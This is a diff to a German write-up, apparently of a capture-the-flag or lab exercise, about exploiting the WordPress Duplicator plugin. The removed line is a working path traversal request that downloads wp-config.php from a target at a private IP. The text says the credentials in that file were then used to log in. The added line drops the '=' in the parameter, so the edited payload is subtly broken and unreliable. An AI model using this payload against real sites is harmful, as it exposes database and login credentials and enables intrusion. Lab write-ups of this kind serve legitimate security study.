@@ -65,7 +65,7 @@ In Exploit-DB habe ich folgenden Exploit gefunden:
 Ich habe den Exploit so gebaut:
 
 ```bash
-http://192.168.1.205/S3cr3t/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
+http://192.168.1.205/S3cr3t/wp-admin/admin-ajax.php?action=duplicator_download&file../wp-config.php
 ```
 
 Dadurch konnte ich die Datei mit Passwortinformationen lesen und mich im Webinterface anmelden.
